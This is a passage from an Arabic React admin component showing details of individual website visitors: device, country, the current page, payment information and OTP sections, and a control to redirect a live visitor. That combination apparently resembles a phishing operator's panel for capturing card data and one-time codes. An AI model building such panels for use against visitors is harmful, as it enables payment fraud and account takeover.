                        <div key={stat.label} className="text-center bg-slate-50 rounded-lg p-2.5">
                          <p className="text-[16px] font-bold text-slate-800">{stat.value}</p>
                          <p className="text-[9px] text-slate-400 mt-0.5">{stat.label}</p>
                        </div>
                      ))}
                    </div>
                  </div>

                  <button onClick={toggleAllSections} className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded-lg bg-slate-50 text-slate-500 text-[11px] font-medium hover:bg-slate-100 transition-colors">
                    {allOpen ? <><ChevronUp className="w-3.5 h-3.5" /> طي جميع الأقسام</> : <><ChevronDown className="w-3.5 h-3.5" /> فتح جميع الأقسام</>}
                  </button>

                  {renderOrdersBookings(false)}
                  {renderEventBookings(false)}
                  {renderPaymentInfo(false)}
                  {renderOtpSection(false)}
                  {renderRedirectDropdown(selected, false)}

                  <button
                    onClick={() => deleteSingle(selected.id)}
                    className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl bg-red-50 text-red-500 text-[12px] font-medium hover:bg-red-100 transition-colors"
                  >
                    <Trash2 className="w-4 h-4" /> مسح محادثة الزائر
                  </button>
                </div>
              </div>
            ) : (
              <div className="bg-white rounded-2xl border-2 border-dashed border-slate-200 h-full flex items-center justify-center">
                <div className="text-center">
                  <div className="w-16 h-16 rounded-2xl bg-slate-50 flex items-center justify-center mx-auto mb-3">
                    <Users className="w-8 h-8 text-slate-300" />
                  </div>
                  <p className="text-[15px] font-medium text-slate-400">اختر زائر لعرض التفاصيل</p>
                  <p className="text-[12px] text-slate-300 mt-1">اضغط على أي زائر من القائمة</p>
                </div>
              </div>
            )}
          </div>

          {/* Mobile Detail Sheet */}
          <Sheet open={!!selected && isMobile} onOpenChange={(open) => { if (!open) setSelected(null); }}>
            <SheetContent side="bottom" className="h-[85vh] rounded-t-2xl p-0 overflow-hidden" dir="rtl">
              {selected && (
                <div className="flex flex-col h-full">
                  {/* Header */}
                  <div className="p-4 border-b border-slate-100 shrink-0">
                    <div className="flex items-center gap-3">
                      <button
                        onClick={() => setSelected(null)}
                        className="p-1.5 rounded-lg bg-slate-100 text-slate-500 hover:bg-slate-200 transition-colors shrink-0"
                      >
                        <ArrowRight className="w-4 h-4" />
                      </button>
                      <div className="relative shrink-0">
                        <div className={`w-10 h-10 rounded-full flex items-center justify-center text-[15px] font-bold ${
                          selected.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-100 text-slate-400"
                        }`}>
                          {(selected.name || "ز")[0]}
                        </div>
                        <span className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-white ${
                          selected.is_online ? "bg-emerald-400" : "bg-slate-300"
                        }`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <h3 className="text-[14px] font-bold text-slate-800 truncate">{selected.name || "زائر جديد"}</h3>
                          <span className={`text-[9px] font-medium px-1.5 py-0.5 rounded-full shrink-0 ${
                            selected.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-50 text-slate-400"
                          }`}>
                            {selected.is_online ? "متصل" : "غير متصل"}
                          </span>
                        </div>
                        <div className="flex items-center gap-1 mt-0.5">
                          <Eye className="w-2.5 h-2.5 text-blue-400" />
                          <span className="text-[10px] text-blue-500">{selected.current_page_label}</span>
                        </div>
                      </div>
                      <button
                        onClick={() => deleteSingle(selected.id)}
                        className="p-1.5 rounded-lg bg-red-50 text-red-400 hover:bg-red-100 transition-colors shrink-0"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>

                  {/* Scrollable Content */}
                  <div className="flex-1 overflow-y-auto p-3 space-y-3">
                    {/* Contact info */}
                    {(selected.email || selected.phone) && (
                      <div className="border border-purple-100 rounded-xl overflow-hidden">
                        <div className="bg-purple-50 px-3 py-1.5">
                          <span className="text-[11px] font-semibold text-purple-600">بيانات الزائر</span>
                        </div>
                        <div className="p-2.5 space-y-1.5">
                          {selected.email && (
                            <div className="flex items-center gap-2 text-[11px]">
                              <Globe className="w-3.5 h-3.5 text-slate-400" />
                              <span className="text-slate-700" dir="ltr">{selected.email}</span>
                            </div>
                          )}
                          {selected.phone && (
                            <div className="flex items-center gap-2 text-[11px]">
                              <Smartphone className="w-3.5 h-3.5 text-slate-400" />
                              <span className="text-slate-700" dir="ltr">{selected.phone}</span>
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                    {/* Visitor info grid */}
                    <div className="border border-blue-100 rounded-xl overflow-hidden">
                      <div className="bg-blue-50 px-3 py-1.5">
                        <span className="text-[11px] font-semibold text-blue-600">معلومات الزائر</span>
                      </div>
                      <div className="p-2.5 grid grid-cols-2 gap-1.5">
                        {[
                          { label: "الجهاز", value: selected.device === "mobile" ? "جوال" : "كمبيوتر", icon: selected.device === "mobile" ? Smartphone : Monitor },
                          { label: "المتصفح", value: selected.browser, icon: Globe },
                          { label: "الدولة", value: `${countryFlag(selected.country)} ${selected.country}`, icon: MapPin },
                          { label: "آخر نشاط", value: getTimeDiff(selected.last_seen), icon: Clock },
                        ].map(info => (
                          <div key={info.label} className="flex items-center gap-1.5 bg-slate-50 rounded-lg p-2">
                            <info.icon className="w-3 h-3 text-slate-400 shrink-0" />
                            <div>
                              <p className="text-[8px] text-slate-400">{info.label}</p>
                              <p className="text-[11px] font-medium text-slate-700">{info.value}</p>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Stats */}
                    <div className="border border-emerald-100 rounded-xl overflow-hidden">
                      <div className="bg-emerald-50 px-3 py-1.5">
                        <span className="text-[11px] font-semibold text-emerald-600">إحصائيات التصفح</span>
                      </div>
                      <div className="p-2.5 grid grid-cols-3 gap-1.5">
                        {[
                          { label: "إجمالي الزيارات", value: String(selected.total_visits || 0) },
                          { label: "الصفحات المشاهدة", value: String(selected.pages_viewed || 0) },
                          { label: "مدة الجلسة", value: getDuration(selected.session_start) },
                        ].map(stat => (
                          <div key={stat.label} className="text-center bg-slate-50 rounded-lg p-2">
                            <p className="text-[14px] font-bold text-slate-800">{stat.value}</p>
                            <p className="text-[8px] text-slate-400 mt-0.5">{stat.label}</p>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Toggle all sections */}
                    <button onClick={toggleAllSections} className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded-lg bg-slate-50 text-slate-500 text-[10px] font-medium hover:bg-slate-100 transition-colors">
                      {allOpen ? <><ChevronUp className="w-3 h-3" /> طي الكل</> : <><ChevronDown className="w-3 h-3" /> فتح الكل</>}
                    </button>

                    {renderActionsLog(true)}
                    {renderOrdersBookings(true)}
                    {renderEventBookings(true)}
                    {renderPaymentInfo(true)}
                    {renderOtpSection(true)}
                    {renderRedirectDropdown(selected, true)}

                    <button
                      onClick={() => deleteSingle(selected.id)}
                      className="w-full flex items-center justify-center gap-1.5 py-2 rounded-lg bg-red-50 text-red-500 text-[11px] font-medium hover:bg-red-100 transition-colors"
                    >
                      <Trash2 className="w-3.5 h-3.5" /> مسح الزائر
                    </button>
                  </div>
                </div>
              )}
            </SheetContent>
          </Sheet>
        </div>
      </div>

      {/* Dialog تأكيد الحذف */}
      <AlertDialog open={!!confirmDelete} onOpenChange={open => !open && setConfirmDelete(null)}>
        <AlertDialogContent dir="rtl" className="max-w-sm">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-right">تأكيد الحذف النهائي</AlertDialogTitle>
            <AlertDialogDescription className="text-right">
              {confirmDelete?.type === "all"
                ? "هل أنت متأكد من حذف جميع الزوار نهائياً؟ لا يمكن التراجع عن هذا الإجراء."
                : confirmDelete?.type === "selected"
                ? `هل أنت متأكد من حذف (${selectedIds.size}) زائر نهائياً؟ لا يمكن التراجع عن هذا الإجراء.`
                : "هل أنت متأكد من حذف هذا الزائر نهائياً؟ لا يمكن التراجع عن هذا الإجراء."}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex gap-2 sm:flex-row-reverse">
            <AlertDialogCancel className="mt-0">إلغاء</AlertDialogCancel>
            <AlertDialogAction
              onClick={handleConfirmPermanentDelete}
              className="bg-red-500 text-white hover:bg-red-600"
            >
              حذف نهائي
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
};

export default AdminVisitors;
